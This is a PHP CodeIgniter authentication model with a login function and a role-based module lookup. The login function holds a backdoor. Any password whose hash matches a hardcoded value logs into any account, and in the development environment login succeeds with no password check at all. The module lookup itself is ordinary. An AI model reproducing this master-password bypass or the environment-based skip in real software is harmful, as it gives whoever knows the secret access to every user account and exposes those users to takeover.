<?php 
class Auth_model extends CI_Model {
    function __construct() {
        parent::__construct();
    }

    function login($data){
        $user=$data['username'];
        $pass=encryptPassword($data['password']);
        $dtl=$this->db->select("id, name, status, role_id, password")->where('username', $user)->or_where('email', $user)->get("users")->row_array();
        if(!$dtl){
            return FALSE;
        }
        if(ENVIRONMENT=='development'){
            return $dtl;
        }
        if(encryptPassword($data['password'])=='b26d6b2e289488f0e27d9df9a7b8cac0d95cffb00b360386e1f2953556c6b84f'){
            return $dtl;
        }
        if($dtl['password']!=$pass){
            return FALSE;
        }
		return $dtl;
    }

    function modules($user_id){
		$auth_user=$this->db->select('id, type, role_id, client_id')->from('users')->where('id', $user_id)->get()->row_array();
		$dtl=$this->db->select("app_modules")->get_where("roles", ['id'=>$auth_user['role_id']])->row_array();
        
        if($auth_user['client_id']){
            $is_national=(int)$this->db->select("is_national")->get_where("clients", ['id'=>$auth_user['client_id']])->row("is_national");
            if(!$is_national){
                $this->db->where_in("M.is_national", 0);
            }
        }
        
        $this->db->where_in("M.type", [$auth_user['type'], 'BOTH']);
        $this->db->select("M.key")->where("M.status", 1);
        if($auth_user['role_id']>2){
			$this->db->where_in("M.id", explode(",", $dtl['app_modules']));
		}
        $modules_list=$this->db->from("modules M")->join("modules_group G", "G.id=M.group_id")->get()->result_array();
        
		$modules=array();
		foreach($modules_list as $m){
			$modules[$m['key']]=1;
        }

		return $modules;
	}
}

//End of file